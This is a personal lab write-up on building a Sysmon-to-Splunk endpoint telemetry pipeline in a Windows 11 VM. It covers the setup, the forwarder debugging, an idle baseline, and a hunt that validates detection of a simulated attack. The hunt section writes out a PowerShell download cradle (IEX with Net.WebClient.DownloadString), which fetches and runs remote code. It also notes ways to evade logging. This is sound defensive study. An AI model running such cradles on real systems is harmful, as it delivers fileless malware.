# Week 5: Endpoint Telemetry Lab (Sysmon to Splunk Pipeline)

> **Goal of Month 2:** Close the endpoint-visibility gap that blocked Hunt #03.
> In BOTS v3 I could see *that* a connection happened, but not *which process*
> made it, because that dataset had no Sysmon EventID 3 (network). This lab
> builds my own endpoint telemetry pipeline end to end so I control what's
> collected, then validates it with a simulated attack technique.

---

## 1. Architecture (what I built)

```
+---------------------- Host machine (physical PC) ----------------------+
|                                                                        |
|  +------- VM: WIN11-ENDPOINT (VirtualBox) -------+   +-- Splunk Ent --+|
|  |  Sysmon (kernel driver + service)             |   | localhost:8000 ||
|  |    writes to Windows Event Log                |   | (web UI)       ||
|  |  Universal Forwarder ------------------------->---> port 9997      ||
|  |    reads Sysmon Operational log               |   | index=endpoint ||
|  +-----------------------------------------------+   +----------------+|
|                          (host-only network 192.168.56.0/24)          |
+------------------------------------------------------------------------+
```

**Data flow direction:** the VM *produces and ships* logs; Splunk *receives*
them. The VM does not pull anything from Splunk. I only pull from Splunk when I
run searches.

**Real-world analogy:**
- VM is an employee's laptop (endpoint)
- Sysmon is the telemetry agent installed on it
- Universal Forwarder is the courier that carries logs to the SIEM
- Splunk is the SOC's SIEM

---

## 2. Core concepts (so future-me remembers the "why")

### What Sysmon is
- Free Microsoft/Sysinternals tool. **Not** built into Windows; I installed it.
- Records security-relevant events happening *inside* a Windows host: process
  starts, network connections, DNS queries, file creation, registry changes,
  process injection, and so on.
- Two parts: a **kernel driver** (`SysmonDrv`, catches events at the source) and
  a **service** (`Sysmon64`, filters per config and writes the log).
- Writes to Windows' own log system, but in its own branch:
  `Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`
- **Strength:** deep endpoint-internal visibility. **Limit:** only sees the one
  machine it's installed on. It does NOT cover identity/login events (that's the
  Windows Security log), network-wide flows (firewall/Zeek), or cloud (audit
  logs).

### Sysmon vs. built-in Windows logs
- Built-in logs (Security, System, Application) exist by default but are too
  shallow for real hunting.
- Sysmon is the high-resolution lens: same events, far richer detail (full
  command line, parent process, hashes, destination IP/port, and so on).

### SwiftOnSecurity config
- **It's a file, not a program.** An XML rule set telling Sysmon *what to log
  and what to ignore*.
- Community-maintained baseline (years of tuned false-positive knowledge).
- I downloaded it and applied it; it did not ship with Windows or Sysmon.
- Two rule styles inside it, working together:
  - `onmatch="include"` means "only log these" (a selective hunter: e.g.
    binaries in `C:\Users` making network connections, LOLBins like
    `certutil.exe`).
  - `onmatch="exclude"` means "log everything except these known-good ones"
    (e.g. Windows Defender, Teams, `.microsoft.com` update traffic).
- Insight: **the exclude list is also the attacker's hiding map.** Malware that
  drops itself in an excluded path (e.g. Defender's Platform folder) can slip
  past. A future hunt: "what could be hiding behind the excludes?"

### Three separate things (don't conflate)
1. **Sysmon** is the recorder (installed in the VM)
2. **SwiftOnSecurity** is the rule file telling it what to record
3. **Splunk forwarding** carries those records off-box to Splunk

Sysmon + config work fine with no Splunk at all (logs sit in Event Viewer).
Splunk is just centralization and search.

### The three Splunk metadata fields (learned the hard way)
- `index` is which bucket the data lives in
- `sourcetype` is what format/parser applies
- `source` is where it came from

Integrations can key off ANY of these. See the debug story below.

### CIM fields vs. raw Sysmon fields
- **Raw Sysmon fields** (`Image`, `QueryName`, `DestinationIp`, `CommandLine`,
  `ProcessGuid`) come straight from the XML and exist on (almost) every EventID.
- **CIM fields** (`app`, `dest_ip`, `src_ip`, `action`) are the add-on's
  translation into Splunk's Common Information Model, a shared dictionary so data
  from many sources can be searched with one field name.
- **Gotcha:** CIM fields only exist where they're *meaningful*. `app` exists on
  EventID 3 (Network Traffic model) but NOT on EventID 22 (DNS model), which is
  why `app="*powershell*"` returned 0 on EventID 22 while `Image="*powershell*"`
  worked.
- **Rule of thumb:** use raw `Image`/`ProcessGuid` for portable, cross-EventID
  searches; use CIM fields for cross-*source* correlation. If a field returns 0,
  first ask "does this field even exist on this EventID?" (expand an event and
  check the field list).

---

## 3. Build steps (condensed runbook)

### Host prerequisites
- Enabled CPU virtualization in BIOS: **ASUS TUF X570 > Advanced > CPU
  Configuration > SVM Mode = Enabled** (AMD Ryzen 9 5900X). Verify in Task
  Manager > Performance > CPU > "Virtualization: Enabled".
- SVM/VT-x just flips a CPU capability on; it is not a security hole by itself.

### VM
- VirtualBox 7.2 + matching Extension Pack.
- Windows 11 Enterprise **Evaluation** ISO (90 days; extendable with
  `slmgr /rearm` up to ~270 days).
- VM specs: 8 GB RAM, 4 CPU, 80 GB dynamic disk, EFI + TPM 2.0 + Secure Boot.
- Local account created by bypassing the MS-account screen ("Sign-in options >
  Domain join instead").
- Guest Additions installed (run `VBoxWindowsAdditions-amd64.exe` **as
  administrator** if it silently fails), then View > Auto-resize Guest Display.
- **Snapshots taken as save points:**
  - `01-clean-install`: clean Win11 + updates + Guest Additions
  - `02-sysmon-installed`: Sysmon + config verified
  - `03-forwarder-working`: logs flowing to Splunk
  - *(consider `04-addon-working` after the source fix below)*

### Sysmon
```powershell
# In the VM, admin PowerShell
Expand-Archive C:\Users\labuser\Downloads\Sysmon.zip C:\Users\labuser\Downloads\Sysmon
C:\Users\labuser\Downloads\Sysmon\Sysmon64.exe -accepteula -i C:\Users\labuser\Downloads\sysmonconfig-export.xml
# Success ends with: "Sysmon64 started."
```
Verified in Event Viewer, then proved EventID 3 works by triggering a request
and reading Image / DestinationIp / User off the event.

### Splunk (host)
- Settings > Forwarding and receiving > **Configure receiving > port 9997**
- Settings > Indexes > **New Index: `endpoint`** (keeps VM logs separate from
  BOTS v3)
- Note: start Splunk reliably with
  `& "C:\Program Files\Splunk\bin\splunk.exe" start` (the service wrapper can
  hang).

### Networking
- Added **Adapter 2 = Host-only Adapter** to the VM (Adapter 1 stays NAT for
  internet).
- Host on this net is `192.168.56.1`; VM got `192.168.56.102`.
- Verified path from VM: `Test-NetConnection 192.168.56.1 -Port 9997` returned
  `TcpTestSucceeded : True`.

### Universal Forwarder (VM)
- Installed 64-bit UF, pointed **Receiving Indexer = 192.168.56.1 : 9997**, left
  Deployment Server blank.
- `inputs.conf` at
  `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`.

---

## 4. Debug war-story (the valuable part)

Three real walls, each with the diagnosis method that cracked it.

### Wall 1: Forwarder connected but 0 events (`errorCode=5`)
- Symptom: `list forward-server` showed **Active** to 9997, yet `index=endpoint`
  was empty.
- Diagnosis: filtered `splunkd.log` for `WinEventLog|Sysmon` and found:
  `WinEventLogChannel::subscribeToEvtChannel ... errorCode=5` (Access Denied).
- Cause: UF runs as the low-privilege `NT SERVICE\SplunkForwarder` account, which
  can't read Sysmon's protected Operational channel.
- **Fix:** `services.msc` > SplunkForwarder > **Log On > Local System account** >
  Restart service. Logs began flowing (1,240+ events).

### Wall 2: Data arrives but fields don't extract (`EventCode=3` = 0)
- Symptom: raw events searchable, but `EventCode=3` and
  `stats count by EventCode` returned nothing. Data was raw XML blobs; the add-on
  wasn't parsing.
- Dead ends I tried (documented as lessons): forcing `sourcetype` in inputs.conf
  (WinEventLog ignores it under `renderXml`), then a host-side props/transforms
  rewrite, then a search-time `rename`. None worked.
- Real cause (found in Splunk community threads): the current **Splunk Add-on for
  Sysmon keys off the `source` field**, not sourcetype. It expects
  `source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`. My events had
  `source = WinEventLog:...` (missing the `Xml` prefix).
- **Fix, final working `inputs.conf`:**
  ```ini
  [WinEventLog://Microsoft-Windows-Sysmon/Operational]
  disabled = false
  renderXml = true
  index = endpoint
  source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
  ```
  Restart the forwarder; new events parse (EventCode, Image, dest_ip, and so on).
- **Note:** sourcetype in Splunk is stamped at index time and is immutable, so
  only events ingested *after* the fix parse. Always test with a short time
  range, not "All time".

### Lessons from the debug
1. **Verify the contract, not the assumption.** Reading the add-on's docs/source
   first would have collapsed three days into one. Always ask up front: "exactly
   which field does this integration key off?"
2. `index` / `sourcetype` / `source` are three different levers; integrations can
   bind to any of them.
3. Indexed data is written in stone; label fixes only affect new data.
4. Filtering the daemon log (`Select-String`) beats scrolling. The `errorCode=5`
   line was buried before a healthy "Connected" loop.

---

## 5. Baseline (idle clean endpoint, ~1 hour)

`index=endpoint | stats count by EventCode | sort -count` (via `spath` before the
add-on, natively after):

| EventID | Meaning | Count | Note |
|---|---|---|---|
| 1 | Process Create | ~768 | Always the largest bucket |
| 11 | File Create | ~200 | Windows housekeeping |
| 13 | Registry Set | ~181 | Background noise |
| 2 | File creation time changed | ~38 | Timestomp-relevant |
| 8 | CreateRemoteThread | ~33 | Investigated; all benign (svchost, Defender, the forwarder itself) |
| 12 | Registry create/delete | ~17 | |
| 22 | DNS Query | ~14 | Low, idle box |
| 3 | Network Connect | ~6 | Our star field; single digits when idle |
| 15 | FileCreateStreamHash | ~4 | ADS / Mark-of-the-Web |
| 5 | Process Terminate | ~3 | |
| 4 | Sysmon service state | ~1 | Sysmon's own start record |

**Documented baseline statement:** *An idle clean Win11 endpoint produces ~1,200
events/hour, ~60% process-create, with single-digit EventID 3.* Future anomalies
will be deviations from this.

**EventID 8 mini-hunt:** almost all `SourceImage = <unknown process>` (thread
creator exited before Sysmon resolved the name, which is normal). Targets were
all expected system/security processes. A real alarm would be a `C:\Users\...`
binary targeting `lsass.exe` (credential-dumping pattern), which was not present.

---

## 6. Hunt #04: Detection validation (simulated download cradle)

### Hypothesis-driven, not checklist-driven
I did NOT start from "which EventIDs?" I started from **"if a download cradle
ran, would my endpoint see it?"** A download cradle's behavior maps to three
traces, so I looked at those three:
- process starts, so **EventID 1**
- domain resolved, so **EventID 22**
- server contacted, so **EventID 3**

> The EventID choice *derives from the hypothesis*, not the other way around.
> Different hypothesis means different EventIDs (credential dumping to 10;
> persistence to 13/12/11; DLL side-loading to 7). This is PEAK
> hypothesis-driven hunting in practice.

### What a download cradle is
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://.../README.md')
```
- `New-Object Net.WebClient` creates a web client (an "internet bucket")
- `.DownloadString(url)` fetches the URL's content as text
- `IEX` (Invoke-Expression) runs that fetched text **as a command**
- Combined: "download code from the internet and execute it immediately," often
  fileless (in memory), which is why it's a classic attacker first stage.
- I used a harmless README as the target: the content isn't valid PowerShell so
  it errored, but that's fine. I wanted the **behavior** (network + DNS), not the
  payload.

### Findings (correlation across three lenses)
- **EventID 3 (network):** `powershell.exe` to `185.199.108.133:443`
  (`cdn-185-199-108-133.github.com`). Full process attribution, which is the Hunt
  #03 gap now closed.
- **EventID 22 (DNS):** `powershell.exe` queried `raw.githubusercontent.com`;
  `QueryResults` returned 185.199.108/109/111.133 (plus IPv6 2606:50c0:...).
- **Correlation:** the IP EventID 3 connected to (185.199.108.133) is one of the
  IPs the DNS answer returned. Two independent telemetry sources confirming one
  event. Single events can lie; DNS + Network + Process agreeing means proven.

### Key discovery: the command-line visibility gap
Ran the same technique two ways:

| Attempt | How run | EventID 1 CommandLine | Lesson |
|---|---|---|---|
| 1 | Typed `IEX...` into an already-open PowerShell window | just `powershell.exe`, command **hidden** | Interactive commands escape process-create logging |
| 2 | Launched a benign command via `-Command` | full text **visible** | Launch-time commands are captured |
| Bonus | Tried launching the cradle via `-Command` | **blocked** ("Access is denied") | Windows Smart App Control / App Control caught the technique |

- **Why:** EventID 1 freezes the command line *at process birth*. A command typed
  into an existing shell was never part of a process launch, so it isn't recorded.
- **Takeaway (the thesis of Month 2, proven):** *Trusting one telemetry type
  creates blind spots. The process command line can be hidden, but the machine's
  reach outward (network + DNS) cannot.* This is exactly why the EventID 3 gap in
  Hunt #03 mattered.
- **Bonus finding:** the OS's own defense (Smart App Control, which showed as
  "App Control for Business: Enforced") blocked the launch-time cradle. That's a
  reason attackers prefer interactive shells: it avoids both command-line logging
  *and* launch-time controls.

---

## Quick reference: mental model
- Hunts start from a **question/hypothesis**, not from a data source. The source
  (Sysmon here) is chosen because the question is endpoint-internal.
- Two hunt entry styles:
  - **Technique-driven:** filter by EventCode from the start.
  - **IOC-driven:** search the indicator (IP/hash/domain) first, then use
    `... | stats count by EventCode` to see where it left traces.
- `Image` / `ProcessGuid` are safe, portable fields. CIM fields (`app`,
  `dest_ip`) are great for cross-source correlation, but check they exist on your
  EventID.
